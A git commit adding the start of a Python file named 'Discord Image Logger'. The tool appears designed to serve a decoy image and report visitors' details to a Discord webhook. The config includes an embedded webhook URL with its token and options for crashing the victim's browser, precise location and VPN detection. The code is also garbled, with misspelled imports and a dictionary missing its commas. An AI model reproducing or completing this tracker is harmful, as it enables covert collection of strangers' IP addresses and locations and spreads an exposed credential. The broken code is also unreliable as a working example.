0342e515ea1871c0a4531befb2f218658b4db0e7
mieeeeeeeeew <dimitrismini1@gmail.com>
2025-05-09 15:19:04 +0300

    Create image.py

---
+++ api/image.py
@@ -0,0 +1,26 @@
+from https.server import BaseHTTPSRequestHandler
+from wrlib import parse
+import traceback, requests, base64, httpagentparser
+
+__app__ = "Discord Image Logger"
+__description = ""
+__version__ = "v0.1"
+__author__ = "anonymous"
+
+config = {
+  "webhook": "https://discord.com/api/webhooks/1370374047115776091/fjct1pJBSbSq2RWvMJiCX1LznTBON4sBPc1rn1Q-MzokIJiYJ_dE1fs4a_Io4ez04QIb"
+  "image": "https://cdn.neowin.com/news/images/uploaded/2023/06/1686292349_windows_xp_bliss_wallpaper_4k.jpg"
+
+  "imageArguement": True
+
+  #OPTIONS
+  "crashBrowser": False
+
+  "accurateLocation": False
+  
+  "message": {
+    
+  },
+
+  "vpnCheck": 1
+}
